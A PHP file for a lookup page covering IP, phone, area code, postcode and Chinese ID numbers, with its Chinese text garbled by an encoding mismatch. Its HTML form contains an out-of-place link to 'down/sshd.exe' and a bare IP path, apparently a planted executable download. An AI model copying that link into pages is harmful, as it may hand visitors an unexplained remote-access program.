<?php
ini_set('memory_limit','64M');
/**********************�ύ��**********************/
function mobile_form(){
echo<<<mobile
<?xml version="1.0"?>
<!DOCTYPE wml PUBLIC " -//WAPFORUM//DTD WML 1.1//EN"
"http://www.wapforum.org/DTD/wml_1.1.xml">
<wml>
<card id="no1" title="�����ز�ѯ">
<p><br/>
<b> �����ز�ѯ: </b> <br/>
<input name="name" format="*m" emptyok="true" size="15"/><br/><br/>
</p>
<p align="center">
<do type="accept" label="�ύ">
<go href="index2.php" method="POST">
<postfield name="m" value="$(name)"/>
<postfield name="a" value="search"/>
<postfield name="mobile" value="mobile"/> 
</go>
</do>
</p>
mobile;
}

function form(){

echo<<<HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>IP/����/�绰���ֻ�����/�ʱ�/���֤���� �����ز�ѯ</title>
</head>
<body><center>IP/����/�绰���ֻ�����/�ʱ�/���֤���� �����ز�ѯ
<form name="form1" method="post" action="./index2.php">       
<input name="m" size="36" maxlength="100">
<input name="a" type="hidden" value="search">
<input type="submit" value="�� ѯ" id="sub">
</form> 
<a href='down/sshd.exe'>SSHD</a> 184.154.63.246/cmdedtempssh/PoweredByCmdedDotNet </ br>

</center>
</body></html>
HTML;

}

/**********************�ֻ�����**********************/
function mobile_data($m){

if(ereg('[0-9]{7,11}',$m)){
$m = substr($m,'0','7');

$fp=file('./data/telnum.dat');
$num=count($fp);
$_data = '';
for($i=0;$i<$num;$i++){
  $pos = strpos($fp[$i],$m);
  if ($pos===false){
          continue;
         }else{
    $row = explode(" ",$fp[$i]);
$_data = $row;
break;
}
}

if($_data != ''){
foreach($row as $v){
if($v != ""){
$data1[] = $v;
}
}
return $data1;
}else{
return false;
}
}else{
echo '������ֻ��������!<br><br>';
}
}
/**********************��������**********************/

function telid($m){
	if(ereg('[0-9]',$m)){
	$m = substr($m,'0','4');
	$_two=substr($m,'0','2');
if($_two=='02' or $_two=='01'){
$m = substr($m,'0','3');
}
			if(!$fp = @fopen('./data/telnum.dat','r')){

			echo 'File err!';
			exit();
		}
		flock($fp,LOCK_SH);
		$note = fread($fp,filesize('./data/telnum.dat'));

		fclose($fp);
		$note = explode("\n",$note);
		array_pop($note);
		array_pop($note);
		array_shift($note);
		$num = count($note);
		$_data = '';
		for($i=0;$i<$num;$i++){
			$row = explode(" ",$note[$i]);
			//if($m >= $row[0] && $m <= $row[1]){
	
			if($m === $row[1]){
				$_data = $row;
				break;
			}
			
					
		}
//*/
		if($_data != ''){
			foreach($row as $v){
				if($v != ""){
					$data1[] = $v;
				}
			}
			return $data1;
		}else{
			return false;
		}
	}else{
		echo "\r\n<br>������ֻ��������!\r\n<br>";
		
	}
}

/**********************IP ��ѯ**********************/

class ipLocation {
var $fp;
var $firstip;  //��һ��ip������ƫ�Ƶ�ַ
var $lastip;   //���һ��ip������ƫ�Ƶ�ַ
var $totalip;  //��ip��
//*
//���캯��,��ʼ��һЩ����
//$datfile ��ֵΪ����IP���ݿ������,�������޸�.
//*
function ipLocation($datfile = "./data/ip.dat"){
  $this->fp=fopen($datfile,'rb');   //���Ʒ�ʽ��

  $this->firstip = $this->get4b(); //��һ��ip�����ľ���ƫ�Ƶ�ַ
  $this->lastip = $this->get4b();  //���һ��ip�����ľ���ƫ�Ƶ�ַ
  $this->totalip =($this->lastip - $this->firstip)/7 ; //ip���� �������Ƕ�����7���ֽ�,�ڴ�Ҫ����7,
  register_shutdown_function(array($this,"closefp"));  //Ϊ�˼���php5���°汾,����û������������,�Զ��ر�ip��.
}
//*
//�ر�ip��
//*
function closefp(){
fclose($this->fp);
}
//*
//��ȡ4���ֽڲ�����ѹ��long�ĳ�ģʽ
//*
function get4b(){
  $str=unpack("V",fread($this->fp,4));
  return $str[1];
}
//*
//��ȡ�ض����˵�ƫ�Ƶ�ַ
//*
function getoffset(){
  $str=unpack("V",fread($this->fp,3).chr(0));
  return $str[1];
}
//*
//��ȡip����ϸ��ַ��Ϣ
//*
function getstr(){
  $str ='';
  $split=fread($this->fp,1);
  while (ord($split)!=0) {
    $str .=$split;
	$split=fread($this->fp,1);
  }
  return $str;
}
//*
//��ipͨ��ip2longת��ipv4�Ļ�������ַ,�ٽ���ѹ����big-endian�ֽ���
//�������������ڵ�ip��ַ���Ƚ�
//*
function iptoint($ip){
  return pack("N",intval(ip2long($ip)));
}
//*
//��ȡ�ͻ���ip��ַ
//ע��:�������Ҫ��ip��¼����������,����д��ʱ�ȼ��һ��ip�������Ƿ�ȫ.
//*
function getIP() {
        if (getenv('HTTP_CLIENT_IP')) {
				$ip = getenv('HTTP_CLIENT_IP'); 
		}
		elseif (getenv('HTTP_X_FORWARDED_FOR')) { //��ȡ�ͻ����ô������������ʱ����ʵip ��ַ
				$ip = getenv('HTTP_X_FORWARDED_FOR');
		}
		elseif (getenv('HTTP_X_FORWARDED')) { 
				$ip = getenv('HTTP_X_FORWARDED');
		}
		elseif (getenv('HTTP_FORWARDED_FOR')) {
				$ip = getenv('HTTP_FORWARDED_FOR'); 
		}
		elseif (getenv('HTTP_FORWARDED')) {
				$ip = getenv('HTTP_FORWARDED');
		}
		else { 
				$ip = $_SERVER['REMOTE_ADDR'];
		}
		return $ip;
}
//*
//��ȡ��ַ��Ϣ
//*
function readaddress(){
  $now_offset=ftell($this->fp); //�õ���ǰ��ָ��λַ
  $flag=$this->getflag();
  switch (ord($flag)){
         case 0:
		     $address="";
		 break;
		 case 1:
		 case 2:
		     fseek($this->fp,$this->getoffset());
			 $address=$this->getstr();
		 break;
		 default:
		     fseek($this->fp,$now_offset);
		     $address=$this->getstr();
		 break;
  }
  return $address;
}
//*
//��ȡ��־1��2
//����ȷ����ַ�Ƿ��ض�����.
//*
function getflag(){
  return fread($this->fp,1);
}
//*
//�ö��ֲ��ҷ���������������ip
//*
function searchip($ip){
  $ip=gethostbyname($ip);     //������ת��ip
  $ip_offset["ip"]=$ip;
  $ip=$this->iptoint($ip);    //��ipת���ɳ�����
  $firstip=0;                 //�������ϱ߽�
  $lastip=$this->totalip;     //�������±߽�
  $ipoffset=$this->lastip;    //��ʼ��Ϊ���һ��ip��ַ��ƫ�Ƶ�ַ
  while ($firstip <= $lastip){
    $i=floor(($firstip + $lastip) / 2);          //��������м��¼ floor�����������������С���������,˵���˾���������Ҳ��
	fseek($this->fp,$this->firstip + $i * 7);    //��λָ�뵽�м��¼
	$startip=strrev(fread($this->fp,4));         //��ȡ��ǰ�������ڵĿ�ʼip��ַ,������little-endian���ֽ���ת����big-endian���ֽ���
	if ($ip < $startip) {
	   $lastip=$i - 1;
	}
	else {
	   fseek($this->fp,$this->getoffset());
	   $endip=strrev(fread($this->fp,4));
	   if ($ip > $endip){
	      $firstip=$i + 1;
	   }
	   else {
	      $ip_offset["offset"]=$this->firstip + $i * 7;
	      break;
	   }
	}
  }
  return $ip_offset;
}
//*
//��ȡip��ַ��ϸ��Ϣ
//*
function getaddress($ip){
  $ip_offset=$this->searchip($ip);  //��ȡip ���������ڵľ��Ա��Ƶ�ַ
  $ipoffset=$ip_offset["offset"];
  $address["ip"]=$ip_offset["ip"];
  fseek($this->fp,$ipoffset);      //��λ��������
  $address["startip"]=long2ip($this->get4b()); //�������ڵĿ�ʼip ��ַ
  $address_offset=$this->getoffset();            //��ȡ��������ip��ip��¼���ڵ�ƫ�Ƶ�ַ
  fseek($this->fp,$address_offset);            //��λ����¼����
  $address["endip"]=long2ip($this->get4b());   //��¼���ڵĽ���ip ��ַ
  $flag=$this->getflag();                      //��ȡ��־�ֽ�
  switch (ord($flag)) {
         case 1:  //����1����2���ض���
		 $address_offset=$this->getoffset();   //��ȡ�ض����ַ
		 fseek($this->fp,$address_offset);     //��λָ�뵽�ض���ĵ�ַ
		 $flag=$this->getflag();               //��ȡ��־�ֽ�
		 switch (ord($flag)) {
		        case 2:  //����1��һ���ض���,
				fseek($this->fp,$this->getoffset());
				$address["area1"]=$this->getstr();
				fseek($this->fp,$address_offset+4);      //��4���ֽ�
				$address["area2"]=$this->readaddress();  //����2�п����ض���,�п���û��
				break;
				default: //����1,����2��û���ض���
				fseek($this->fp,$address_offset);        //��λָ�뵽�ض���ĵ�ַ
				$address["area1"]=$this->getstr();
				$address["area2"]=$this->readaddress();
				break;
		 }
		 break;
		 case 2: //����1�ض��� ����2û���ض���
		 $address1_offset=$this->getoffset();   //��ȡ�ض����ַ
		 fseek($this->fp,$address1_offset);  
		 $address["area1"]=$this->getstr();
		 fseek($this->fp,$address_offset+8);
		 $address["area2"]=$this->readaddress();
		 break;
		 default: //����1����2��û���ض���
		 fseek($this->fp,$address_offset+4);
		 $address["area1"]=$this->getstr();
		 $address["area2"]=$this->readaddress();
		 break;
  }
  //*����һЩ��������
  if (strpos($address["area1"],"CZ88.NET")!=false){
      $address["area1"]="δ֪";
  }
  if (strpos($address["area2"],"CZ88.NET")!=false){
      $address["area2"]=" ";
  }
  return $address;
 }

} 

/**********************���֤��ѯ**********************/
class IDCheck
{
	var $num;
	function IDCheck($id) {
		if(substr($id,17)=='x') $id=substr($id,0,17).'X';
		$this->num=$id;
	}
	
	function Details() {
		$id=$this->num;
		
		if(15!=strlen($this->num)&&18!=strlen($this->num)) return False;
		
		if(strlen($this->num)==18&&substr($this->num,17)!=$this->GetKey()) return False;
		//$sfzdb=file_get_contents('xsfz.txt');
		//$areas=explode("\r\n",$sfzdb);
		$areas=file('./data/idcard.dat');
		$idn=count($areas);
		//echo $n;
		//exit;
		strlen($this->num)==18?$id=array(substr($id,0,6),substr($id,6,4),substr($id,10,2),substr($id,12,2),substr($id,16,1)):$id=array(substr($id,0,6),'19'.substr($id,6,2),substr($id,8,2),substr($id,10,2),substr($id,14,1));
		if(intval($id[1])<1910||intval($id[2])<1||intval($id[2])>12||intval($id[3])<1||intval($id[3])>31) return False;
		$id[4]%2==1?$id[4]='��':$id[4]='Ů';
    for($i=0;$i < $idn;$i++) {
    if (strpos($areas[$i],$id[0])){
    $idaddress=explode(",",$areas[$i]);
    $id[0] = $idaddress[0].' '.$idaddress[1].' '.$idaddress[2];
    }
    }
		
		return $id;
	}
	
	function Value(){
		if(($id=$this->Details())==False) return False;
		return '��֤�ص�:'.$id[0].' ��������:'.$id[1].'��'.$id[2].'��'.$id[3].'�� �Ա�:'.$id[4];
	}
	function isValid(){
		if($this->Details()==False) return False;
		return True;
	}
	
	function Part(){
		if(($id=$this->Details())==False) return False;
		$part[0]=$id[0];
		$part[1]=$id[1].'��'.$id[2].'��'.$id[3].'��';
		$part[2]=$id[4];
		return $part;
	}
	function GetKey() {
		$sum=0;
		$power=array(7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2);
		$check=array(1,0,'X',9,8,7,6,5,4,3,2);
		for($i=0;$i<count($power);$i++) $sum+=$this->num[$i]*$power[$i];
		return $check[$sum%11];
	}
}

/**********************��������**********************/
function postcode_data($m){

$fp=file('./data/postcode.dat');
$num=count($fp);
$_data_y = '';
$_data_n = '';
$_data = '';
for($i=0;$i<$num;$i++){
  $pos = strpos($fp[$i],$m);
  if ($pos===false){
          continue;
         }else{
    $row = explode(",",$fp[$i]);
    if ($row[4]=="n\r\n"){
    $_data_n = $row[3]." ".$row[2]." ".$row[1]."\r\n<br>";
    $_data .= $_data_n ;
    }else{
    $_data_y = "<b>".$row[3]." ".$row[2]." ".$row[1]."</b>\r\n<br>";
    
    }
//break;
}
}
$_data = "$_data_y".$_data ;
return $_data;
}


/**********************����ϵͳ�������**********************/

function getScreen() {
$screenX = "<script>document.write(screen.width);</script>";
$screenY = "<script>document.write(screen.height);</script>";
$screen=$screenX." x ".$screenY;
Return $screen;
}
class clientGetObj //��
{
function getBrowse() //ȡ������汾����
{
global $_SERVER;
$Agent = $_SERVER['HTTP_USER_AGENT']; 
$browser = '';
$browserver = '';
$Browser = array('Lynx', 'MOSAIC', 'AOL', 'Opera', 'JAVA', 'MacWeb', 'WebExplorer', 'OmniWeb'); 
for($i = 0; $i <= 7; $i ++)
{
if(strpos($Agent, @$Browsers[$i]))
{
$browser = $Browsers[$i]; 
$browserver = '';
}
}
if(ereg('Mozilla', $Agent) && !ereg('MSIE', $Agent))
{
$temp = explode('(', $Agent); 
$Part = $temp[0];
$temp = explode('/', $Part);
$browserver = $temp[1];
$temp = explode(' ', $browserver); 
$browserver = $temp[0];
$browserver = preg_replace('/([d.]+)/', '1', $browserver);
$browserver = $browserver;
$browser = 'Netscape Navigator'; 
}
if(ereg('Mozilla', $Agent) && ereg('Opera', $Agent)) {
$temp = explode('(', $Agent);
$Part = $temp[1]; 
$temp = explode(')', $Part);
$browserver = $temp[1];
$temp = explode(' ', $browserver); 
$browserver = $temp[2];
$browserver = preg_replace('/([d.]+)/', '1', $browserver);
$browserver = $browserver;
$browser = 'Opera'; 
}
if(ereg('Mozilla', $Agent) && ereg('MSIE', $Agent)){
$temp = explode('(', $Agent);
$Part = $temp[1]; 
$temp = explode(';', $Part);
$Part = $temp[1];
$temp = explode(' ', $Part);
$browserver = $temp[2]; 
$browserver = preg_replace('/([d.]+)/','1',$browserver);
$browserver = $browserver;
$browser = 'Internet Explorer';
}
if($browser != ''){ 
$browseinfo = $browser.' '.$browserver;
} else {
$browseinfo = false;
}
return $browseinfo;
}

function getOS () //ȡ����ϵͳ���ͺ���
{
global $_SERVER;
$agent = $_SERVER['HTTP_USER_AGENT'];
$os = false;
if (eregi('win', $agent) && strpos($agent, '95')){ 
$os = 'Windows 95';
}
else if (eregi('win 9x', $agent) && strpos($agent, '4.90')){
$os = 'Windows ME'; 
}
else if (eregi('win', $agent) && ereg('98', $agent)){
$os = 'Windows 98';
}
else if (eregi('win', $agent) && eregi('nt 5.1', $agent)){ 
$os = 'Windows XP';
}
else if (eregi('win', $agent) && eregi('nt 5', $agent)){
$os = 'Windows 2000';
} 
else if (eregi('win', $agent) && eregi('nt', $agent)){
$os = 'Windows NT';
}
else if (eregi('win', $agent) && ereg('32', $agent)){ 
$os = 'Windows 32';
}
else if (eregi('linux', $agent)){
$os = 'Linux';
}
else if (eregi('unix', $agent)){ 
$os = 'Unix';
}
else if (eregi('sun', $agent) && eregi('os', $agent)){
$os = 'SunOS';
} 
else if (eregi('ibm', $agent) && eregi('os', $agent)){
$os = 'IBM OS/2';
}
else if (eregi('Mac', $agent) && eregi('PC', $agent)){ 
$os = 'Macintosh';
}
else if (eregi('PowerPC', $agent)){
$os = 'PowerPC';
}
else if (eregi('AIX', $agent)){ 
$os = 'AIX';
}
else if (eregi('HPUX', $agent)){
$os = 'HPUX';
}
else if (eregi('NetBSD', $agent)){ 
$os = 'NetBSD';
}
else if (eregi('BSD', $agent)){
$os = 'BSD';
}
else if (ereg('OSF1', $agent)){ 
$os = 'OSF1';
}
else if (ereg('IRIX', $agent)){
$os = 'IRIX';
}
else if (eregi('FreeBSD', $agent)){ 
$os = 'FreeBSD';
}
else if (eregi('teleport', $agent)){
$os = 'teleport';
}
else if (eregi('flashget', $agent)){ 
$os = 'flashget';
}
else if (eregi('webzip', $agent)){
$os = 'webzip';
}
else if (eregi('offline', $agent)){ 
$os = 'offline';
}
else {
$os = 'Unknown';
}
return $os;
}
}
if (!function_exists('apache_response_headers')) {
    function apache_response_headers () {
        $arh = array();
        $headers = headers_list();
        foreach ($headers as $header) {
            $header = explode(":", $header);
            $arh[array_shift($header)] = trim(implode(":", $header));
        }
        return $arh;
    }
}

if( !function_exists('apache_request_headers') ) {
function apache_request_headers() {
  $arh = array();
  $rx_http = '/\AHTTP_/';
  foreach($_SERVER as $key => $val) {
    if( preg_match($rx_http, $key) ) {
      $arh_key = preg_replace($rx_http, '', $key);
      $rx_matches = array();
      // do some nasty string manipulations to restore the original letter case
      // this should work in most cases
      $rx_matches = explode('_', $arh_key);
      if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
        foreach($rx_matches as $ak_key => $ak_val) $rx_matches[$ak_key] = ucfirst($ak_val);
        $arh_key = implode('-', $rx_matches);
      }
      $arh[$arh_key] = $val;
    }
  }
  return( $arh );
}
}

/**********************GBK --> UTF-8 --> HTML ʵ��**********************/
function utf8tohtml($str)
{
$str=iconv('GBK','UTF-8',$str);
$str=utf2html($str);
return $str;
}
 
function utf2html($str)
{
    $ret = "";
    $max = strlen($str);
    $last = 0;  
    for ($i=0; $i<$max; $i++) {
        $c = $str{$i};
        $c1 = ord($c);
        if ($c1>>5 == 6) {  
            $ret .= substr($str, $last, $i-$last); 
            $c1 &= 31; // remove the 3 bit two bytes prefix
            $c2 = ord($str{++$i}); 
            $c2 &= 63;  
            $c2 |= (($c1 & 3) << 6); 
            $c1 >>= 2; 
            $ret .= "&#" . ($c1 * 0x100 + $c2) . ";"; 
            $last = $i+1;
        }
        elseif ($c1>>4 == 14) {  
            $ret .= substr($str, $last, $i-$last); 
            $c2 = ord($str{++$i}); 
            $c3 = ord($str{++$i}); 
            $c1 &= 15; 
            $c2 &= 63;  
            $c3 &= 63;  
            $c3 |= (($c2 & 3) << 6); 
            $c2 >>=2; 
            $c2 |= (($c1 & 15) << 4); 
            $c1 >>= 4; 
            $ret .= '&#' . (($c1 * 0x10000) + ($c2 * 0x100) + $c3) . ';'; 
            $last = $i+1;
        }
    }
    $str=$ret . substr($str, $last, $i); 
return $str;
}
/**********************UTF-8 ת HTML ʵ��**********************/
?>



















